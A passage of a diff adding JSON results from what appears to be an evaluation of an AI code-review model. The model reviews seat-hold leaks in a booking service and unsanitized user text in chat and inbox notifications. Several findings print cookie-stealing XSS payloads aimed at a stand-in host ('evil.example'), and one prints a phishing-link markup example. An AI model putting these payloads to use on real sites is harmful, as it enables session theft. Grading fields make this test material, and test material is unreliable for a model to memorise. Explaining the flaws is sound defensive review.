+          "file": "src/bookings/bookings.service.ts",
+          "claim": "WHAT: `book` acquires a seat hold on line 15 but never releases it if `payments.charge` (line 16) or `repo.insert` (line 17) throws, despite the new comment on line 12 claiming it does. WHY: a declined card or a failed insert leaves the hold active, and per `seat-holds.ts` \"Holds never expire: only commit() or release() ends one\", so the seat stays permanently blocked for every user. HOW: wrap the post-acquire work in try/catch and release on failure, mirroring changeSeat/addGuest:\n```ts\nconst hold = await this.holds.acquire(seatId, userId);\ntry {\n    const charge = await this.payments.charge(userId, priceCents);\n    const booking = await this.repo.insert({ userId, seatId, chargeId: charge.id, guests: [] });\n    await this.holds.commit(hold);\n    return booking;\n} catch (err) {\n    await this.holds.release(hold);\n    throw err;\n}\n```",
+          "keep": true,
+          "rationale": "Confirmed in the actual source: `book` (lines 15-18) acquires a hold and then calls `payments.charge` and `repo.insert` with no try/catch and no `release`. The comment on line 12 asserts it releases the hold, but the code does not — the try/catch/release pattern exists only in `changeSeat` (lines 24-32) and `addGuest` (lines 37-45). Since `seat-holds.ts:5` states holds never expire (only `commit()`/`release()` ends one), a declined charge or failed insert permanently blocks the seat. Although a prior review round marked the analogous suggestion \"implemented\", the current diff provides concrete evidence it was not applied to `book`, so the finding stands.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/bookings.service.ts",
+                "startLine": 1,
+                "endLine": 80
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "release|acquire|commit|catch",
+                "path": "src/bookings"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "claim": "WHAT: In changeSeat the catch unconditionally calls `this.holds.release(hold)`, but `free(booking.seatId)` (line 27) runs inside the same try AFTER `commit(hold)` (line 26) has already ended the hold, so a failure in `free` triggers a release of an already-committed hold. WHY: the SeatHolds contract states a hold is ended exactly once by `commit()` or `release()`; releasing a committed hold is an invalid state transition that can either attempt to un-reserve the seat the booking now points to or itself reject, masking the original `free` error and hiding that the old seat was never freed. HOW: keep only the pre-commit steps in the try and run the post-commit cleanup outside it, e.g. update+commit inside the try (release on failure) and `await this.holds.free(booking.seatId)` after the try.",
+          "keep": true,
+          "rationale": "Verified in src/bookings/bookings.service.ts lines 22-33: changeSeat calls commit(hold) at line 26 and then free(booking.seatId) at line 27, both inside the same try. The catch at line 30 unconditionally calls this.holds.release(hold). Since the SeatHolds contract (src/bookings/seat-holds.ts:5) states a hold is ended exactly once by commit() or release(), any throw from free() (a post-commit cleanup step) causes release() to be invoked on an already-committed/ended hold — an invalid state transition that can either un-reserve the seat the booking now points to or itself reject and mask the original free error. The described root cause and failure path match the actual code; the finding is not refuted.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/bookings.service.ts",
+                "startLine": 1,
+                "endLine": 80
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "commit|release|free|acquire",
+                "glob": "**/holds*.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/seat-holds.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "implements SeatHolds|class.*SeatHolds|release\\(|commit\\(",
+                "excludeTests": true
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "line": 12,
+          "earlierId": "round-a-P29-hold-leak-on-create",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 25,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/bookings/bookings.service.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": true,
+          "revisesSuggestionId": "round-a-P29-hold-leak-on-create",
+          "label": "bug",
+          "marked": false,
+          "text": "**Revises an earlier Kody suggestion** on `src/bookings/bookings.service.ts:13` (2026-10-06 12:00 UTC).\n\nIn `changeSeat`, a failure in `free(booking.seatId)` (line 27) after `commit(hold)` (line 26) triggers `release(hold)` on an already-committed hold, an invalid state transition under the `SeatHolds` contract that can un-reserve the seat the booking now points to or mask the original `free` error while the old seat stays unfreed. Move `await this.holds.free(booking.seatId)` outside the `try` so only the `update` and `commit` steps are covered by the `release` fallback."
+        }
+      ],
+      "claims": [
+        {
+          "id": "book-hold-leak-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P29-hold-leak-on-create",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 405140,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "claim": "WHAT: book() still acquires a hold and never releases it on failure, despite the added comment on line 12 claiming it releases the hold like changeSeat/addGuest. WHY: if payments.charge throws (CardDeclinedError) or repo.insert throws, the hold acquired at line 15 is never released, and holds never expire (seat-holds.ts:5), so the seat stays permanently blocked for every other user. HOW: wrap everything after acquire in try/catch and release the hold on failure, mirroring changeSeat/addGuest: `const hold = await this.holds.acquire(seatId, userId); try { const charge = await this.payments.charge(userId, priceCents); const booking = await this.repo.insert({ userId, seatId, chargeId: charge.id, guests: [] }); await this.holds.commit(hold); return booking; } catch (err) { await this.holds.release(hold); throw err; }`.",
+          "keep": true,
+          "rationale": "Confirmed by reading src/bookings/bookings.service.ts:13-20: book() acquires a hold at line 15, then calls payments.charge (16) and repo.insert (17) with no try/catch, committing only on success (18). If charge or insert throws, holds.release is never called. seat-holds.ts:5 confirms holds never expire, so the seat stays permanently blocked. changeSeat and addGuest both correctly wrap in try/catch with release, and the line-12 comment falsely claims book does too. The prior decision (round-a-P29-hold-leak-on-create) claimed this was implemented, but the current diff shows the try/catch was never applied to book, which is concrete evidence the applied change is absent.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/bookings.service.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "release|commit|acquire|expire",
+                "path": "src/bookings"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "claim": "WHAT: changeSeat's try block wraps commit() and free(), so if free(booking.seatId) throws after commit(hold) already succeeded, the catch calls release(hold) on an already-committed hold. WHY: the committed hold is the new seat's hold, so releasing it frees newSeatId even though the booking now points there (a later acquire can double-book it), while the old seat (booking.seatId) is never freed and stays blocked forever (holds never expire). HOW: only release while the hold is still pending, e.g. move commit()/free() out of the try or track a `committed` flag and skip release when the failure happened after commit.",
+          "keep": true,
+          "rationale": "The code structure matches the claim exactly: changeSeat acquires a hold for newSeatId (line 23), then within a single try block calls repo.update, holds.commit(hold), and holds.free(booking.seatId), with the catch unconditionally calling holds.release(hold). Because commit() precedes free(), any throw from free() (or any later error) lands in the catch after the hold for newSeatId was already committed, and release(hold) is invoked on an already-committed hold while the old seat (booking.seatId) is never freed. seat-holds.ts confirms holds only end via commit() or release() and never expire, so this is a genuine ordering/state bug rather than a style nit. Note this is a distinct problem from the previously-implemented suggestion (round-a-P29-hold-leak-on-create) that introduced the release-on-failure pattern; it narrows that fix, and nothing in the current diff shows the commit/free/release ordering was deliberately reworked. Cannot refute: the trigger (throw after commit) is a real path and release on the new seat's committed hold is the plausible failure consequence.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/bookings.service.ts",
+                "startLine": 1,
+                "endLine": 70
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "async (commit|free|release|acquire)\\(",
+                "glob": "**/*hold*"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "seat-holds*"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "SeatHolds",
+                "namesOnly": true
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "free\\(|commit\\(|release\\(|acquire\\(",
+                "glob": "**/seat-holds.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "line": 12,
+          "label": "bug",
+          "earlierId": "round-a-P29-hold-leak-on-create",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-P29-hold-leak-on-create",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 27,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/bookings/bookings.service.ts",
+          "line": 24,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "text": "Because `changeSeat` wraps `commit(hold)` and `free(booking.seatId)` in the same `try`, a throw from `free(booking.seatId)` after `commit(hold)` succeeds makes the `catch` call `release(hold)` on an already-committed hold, freeing `newSeatId` even though the booking now points there (allowing a later `acquire` to double-book it) while `booking.seatId` is never freed and stays blocked forever since holds never expire. Only release while the hold is still pending, for example by moving `commit()`/`free()` out of the `try` or tracking a `committed` flag and skipping `release` when the failure happened after commit."
+        }
+      ],
+      "claims": [
+        {
+          "id": "book-hold-leak-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P29-hold-leak-on-create",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 280182,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "claim": "WHAT: the try block in changeSeat wraps both commit(hold) and free(booking.seatId), so if free() throws after commit() succeeded the catch calls release(hold) on an already-committed hold. WHY: the hold was already committed (seat-holds.ts:5 — commit ends a hold) while the booking was updated to newSeatId, so releasing it frees the new seat while the booking still references it, breaking the seat-taken invariant. HOW: only release when the commit has not yet succeeded, e.g. track a `committed` flag and skip release in the catch once commit() has returned.",
+          "keep": true,
+          "rationale": "The changeSeat try block wraps commit(hold) AND free(booking.seatId), so if free() throws after commit() succeeded, the catch unconditionally calls release(hold) on a hold that commit() already ended (seat-holds.ts:5). The interface does not establish that release() on a committed hold is a no-op, and no implementation is available to prove the seat is not freed, so the described seat-taken invariant break cannot be refuted. This over-release is a new consequence of the earlier 'release the hold on failure' fix (round-a-P29-hold-leak-on-create) that now wraps the post-commit free(). Keep.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/bookings.service.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "seat-holds.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "commit|release|free|acquire",
+                "glob": "**/seat-holds*"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "seat-holds*"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/seat-holds.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "claim": "WHAT: book acquires a seat hold but has no try/catch, so when payments.charge throws (CardDeclinedError) or repo.insert fails the hold is never released — even though the comment added at line 12 claims it is. WHY: seat-holds.ts:5 documents that holds never expire and only commit()/release() ends one, so a declined card permanently blocks the seat for every other user. HOW: wrap the post-acquire work in try/catch and call this.holds.release(hold) before rethrowing, mirroring changeSeat/addGuest.",
+          "keep": true,
+          "rationale": "Confirmed. In src/bookings/bookings.service.ts, book() acquires a hold at line 15 then calls payments.charge (16) and repo.insert (17) with no try/catch, so a CardDeclinedError or insert failure leaks the hold. changeSeat (24-32) and addGuest (37-45) both wrap the post-acquire work in try/catch and call holds.release on error; book does not, despite the comment at line 12 claiming it does. seat-holds.ts:5 confirms holds never expire, so the seat stays blocked. Although the prior decision round-a-P29-hold-leak-on-create is marked \"implemented\", the current diff shows the described try/catch/release is absent from book, which is concrete evidence the fix is not present/reverted — so the finding is not superseded and the root cause and failure path are real.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/bookings.service.ts",
+                "startLine": 1,
+                "endLine": 80
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "release|commit|acquire",
+                "path": "src/bookings"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "line": 15,
+          "label": "bug",
+          "earlierId": "round-a-P29-hold-leak-on-create",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-P29-hold-leak-on-create",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 25,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/bookings/bookings.service.ts",
+          "line": 24,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "text": "In `src/bookings/bookings.service.ts`, if `free(booking.seatId)` throws after `commit(hold)` succeeds, the catch calls `release(hold)` on an already-committed hold, freeing the new seat while the booking still references it and breaking the seat-taken invariant (`seat-holds.ts:5` — `commit` ends a hold). Only release when the commit has not yet succeeded, for example by tracking a `committed` flag and skipping `release(hold)` in the catch once `commit()` has returned."
+        }
+      ],
+      "claims": [
+        {
+          "id": "book-hold-leak-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P29-hold-leak-on-create",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 368129,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "claim": "WHAT: The new comment claims book releases the hold when the card is declined or the insert fails, but book has no try/catch — the hold is never released on failure. WHY: payments.charge throws CardDeclinedError on a declined card (payments.ts:2) and holds never expire (seat-holds.ts:5), so a declined card or a failed repo.insert leaves the seat blocked for every other user permanently. HOW: Wrap everything after acquire in try/catch, call this.holds.release(hold) in the catch, and rethrow (mirroring changeSeat/addGuest).",
+          "keep": true,
+          "rationale": "book acquires a hold then calls payments.charge and repo.insert with no try/catch, so a CardDeclinedError or insert failure exits without holds.release; changeSeat/addGuest both guard this path, and seat-holds.ts:5 confirms holds never expire. The line-12 comment asserts a release that the code does not perform. The prior 'implemented' decision for this issue is contradicted by the current diff (only the comment was added, no try/catch), so it does not excuse the finding.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/bookings.service.ts",
+                "startLine": 1,
+                "endLine": 120
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "release|acquire|commit|try|catch",
+                "path": "src/bookings"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "claim": "WHAT: The catch in changeSeat releases the hold even when the failure occurs after commit(hold) has already succeeded (i.e. when free(booking.seatId) throws), so an already-committed hold is released. WHY: commit(hold) marks newSeatId as taken and the booking now points to newSeatId; releasing that hold frees a seat that is actually booked, letting another user acquire it and producing a double booking. HOW: Only release the hold if it has not been committed — e.g. move free() out of the try, or track a committed flag and skip release when commit already succeeded.",
+          "keep": true,
+          "rationale": "The code path is real: in changeSeat, commit(hold) on newSeatId runs inside the try, and free(booking.seatId) (the old seat) is the next statement in the same try. If free() throws (a plausible DB/network failure), control falls into the catch, which calls holds.release(hold) on the hold for newSeatId that was already committed. Per the SeatHolds interface, acquire() 'marks the seat as taken' and 'only commit() or release() ends one' — i.e. release() is the operation that frees/ends a hold, and there is no documented guard making release() a no-op on an already-committed hold. If release() un-marks newSeatId, a seat the booking now points to becomes acquirable by another user, producing a double booking. I could not find a concrete refutation (no implementation of SeatHolds is present that proves release-after-commit is harmless), so the claim stands. Note this failure is introduced by the previously applied round-a-P29-hold-leak-on-create fix, which added this release-in-catch, so the finding is a legitimate follow-on rather than a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/bookings.service.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "commit|release|free|acquire",
+                "glob": "**/*holds*"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/seat-holds.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "changeSeat\\(",
+                "excludeTests": true
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "release|commit|class.*SeatHold|implements SeatHolds",
+                "glob": "**/*.ts",
+                "excludeTests": true
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "claim": "WHAT: In addGuest the catch releases the hold unconditionally, so when repo.update() succeeds but holds.commit() then throws, the guest's seat hold is released even though the updated booking already lists the guest on that seat. WHY: the booking now references a seat that is free again (holds never expire and only commit/release ends one — seat-holds.ts:5), so another user can acquire/commit the same seat, producing a double booking while the guest has no held seat. HOW: only release the hold when the booking row was not mutated; if commit fails after a successful update, roll the update back (or make the update and commit atomic) before releasing.",
+          "keep": false,
+          "rationale": "The code path (release in catch even when repo.update succeeded) is accurately described, but the claimed consequence — a double booking — is refuted by the SeatHolds contract. seat-holds.ts:4 documents that acquire() throws SeatTakenError if a hold OR A BOOKING already has the seat. The design makes this mandatory: commit() ends the hold (seat-holds.ts:5), so after any successful operation the booking record is the only durable guard; if acquire() did not check bookings, the base book() flow itself would allow re-acquiring a booked seat. In addGuest, once repo.update() succeeds the booking already references the guest's seat, so a later acquire() on that seat fails regardless of the released hold. Thus the seat is not \"free again\" and the predicted double booking cannot occur. The finding relies on seat-holds.ts:5 while ignoring the guarding clause on line 4.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/bookings.service.ts",
+                "startLine": 1,
+                "endLine": 70
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/seat-holds.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "acquire|SeatTakenError|class.*SeatHolds|implements SeatHolds",
+                "excludeTests": true
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "update\\(",
+                "glob": "*.ts",
+                "excludeTests": true
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "line": 12,
+          "label": "bug",
+          "earlierId": "round-a-P29-hold-leak-on-create",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 34,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 3,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/bookings/bookings.service.ts",
+          "line": 24,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "text": "When `free(booking.seatId)` throws after `commit(hold)` succeeds, the catch in `changeSeat` releases an already-committed hold, freeing the newly booked seat so another user can acquire it and cause a double booking. Only release the hold if it has not been committed, for example by moving `free()` out of the `try` or tracking a `committed` flag and skipping `release(hold)` when `commit(hold)` already succeeded."
+        }
+      ],
+      "claims": [
+        {
+          "id": "book-hold-leak-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 116381,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates m.authorName and m.body directly into the inbox HTML without stripInlineMarkup, while the sibling mentionEmail sanitizes both. WHY: InboxStore.add documents that `html` is rendered as is in the web app's notification inbox (clients.ts:11), so a comment body or display name containing e.g. `<img src=x onerror=fetch('//evil/'+document.cookie)>` executes script in the recipient's authenticated session — stored XSS. HOW: pass both fields through stripInlineMarkup before building the html string, matching mentionEmail.",
+          "keep": true,
+          "rationale": "Confirmed. src/notifications/mentions.ts:28 builds inbox HTML by interpolating m.authorName and m.body raw, while the sibling mentionEmail (lines 15-16) passes both through stripInlineMarkup. clients.ts:11 explicitly documents that InboxStore.add's `html` is rendered as-is in the web app's notification inbox, and sanitize.ts documents that comment bodies/display names are untrusted user input. So a crafted name/body like `<img src=x onerror=...>` executes in the recipient's authenticated session — stored XSS. The previous decision (index 1) only covered mentionEmail's sink (lines 15-16), not mentionInbox, so it does not resolve this issue.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates m.authorName and m.body into the chat message text without stripInlineMarkup, unlike mentionEmail. WHY: ChatClient.post documents that `text` uses chat markup where `<url|label>` renders a link and `<!channel>` pings everyone (clients.ts:6), so a crafted comment body such as `<https://evil.example|Reset password>` becomes a live phishing link or `<!channel>` becomes an all-channel ping sent from our app. HOW: wrap m.authorName and m.body in stripInlineMarkup when composing text.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat at src/notifications/mentions.ts:22 interpolates m.authorName and m.body directly into the chat text without stripInlineMarkup, unlike mentionEmail which strips both (lines 15-16). ChatClient.post's doc (clients.ts:6) states text uses chat markup where <url|label> renders a link and <!channel> pings everyone, and sanitize.ts's own comment names these exact chat-markup vectors. So an attacker-controlled comment body like <https://evil.example|Reset password> or <!channel> renders as a live link / all-channel ping from our app. The root cause and failure path are real and reachable; previous decision #1 only covered the email sink, not this chat sink.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 11,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `InboxStore.add` documents that `html` is rendered as is in the web app's notification inbox (`clients.ts:11`), `mentionInbox` lets a comment body or display name containing e.g. `<img src=x onerror=fetch('//evil/'+document.cookie)>` execute script in the recipient's authenticated session, causing stored XSS; unlike the sibling `mentionEmail`, it does not call `stripInlineMarkup` on `m.authorName` and `m.body`. Pass both fields through `stripInlineMarkup` before building the `html` string, matching `mentionEmail`."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `ChatClient.post` documents that `text` uses chat markup where `<url|label>` renders a link and `<!channel>` pings everyone (`clients.ts:6`), `mentionChat` lets a crafted comment body such as `<https://evil.example|Reset password>` become a live phishing link or `<!channel>` become an all-channel ping sent from our app; unlike `mentionEmail`, it does not call `stripInlineMarkup` on `m.authorName` and `m.body`. Wrap both fields in `stripInlineMarkup` when composing the `text`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 97666,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates the user-controlled m.authorName and m.body into the chat message text without sanitization, and clients.ts:6 documents that this text renders chat markup where `<url|label>` becomes a link and `<!channel>` pings everyone. WHY: a commenter can inject `<!channel>` to mass-ping the whole channel or `<https://evil.example|Reset password>` to post a live phishing link from our workspace, matching the same phishing vector previously fixed for email. HOW: pass both values through stripInlineMarkup before building the text, e.g. `text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>``.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat (mentions.ts:20-24) interpolates user-controlled m.authorName and m.body into the chat text without sanitization, unlike mentionEmail which already applies stripInlineMarkup to both fields. clients.ts:6 explicitly documents that chat text renders markup (<url|label> as a link, <!channel> as a mass ping), so an attacker commenter can inject a phishing link or a channel-wide ping. The previous decision addressed only the email sink, leaving this chat sink a distinct, real injection vector. No guard upstream prevents it.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates the user-controlled m.authorName and m.body directly into the `html` field, which clients.ts:11 documents as being \"rendered as is in the web app's notification inbox\". WHY: a commenter can set their display name or body to `<img src=x onerror=\"fetch('https://evil.example?c='+document.cookie)\">` and achieve stored XSS in the victim's notification inbox, executing in the app origin. HOW: wrap both values in stripInlineMarkup before building the html, matching mentionEmail: `html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}``.",
+          "keep": true,
+          "rationale": "Confirmed: mentionInbox (lines 26-31) writes user-controlled m.authorName and m.body straight into the `html` field. clients.ts:11 documents that field as 'rendered as is in the web app's notification inbox', and sanitize.ts:3 states every outbound sink must pass user text through stripInlineMarkup. mentionEmail (15-16) already does so, but this sink does not, allowing stored XSS. The earlier decision fixed only mentionEmail, so this is a separate unfixed sink, not a duplicate.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "rendered as is|rendered as-is|html",
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup|export function",
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
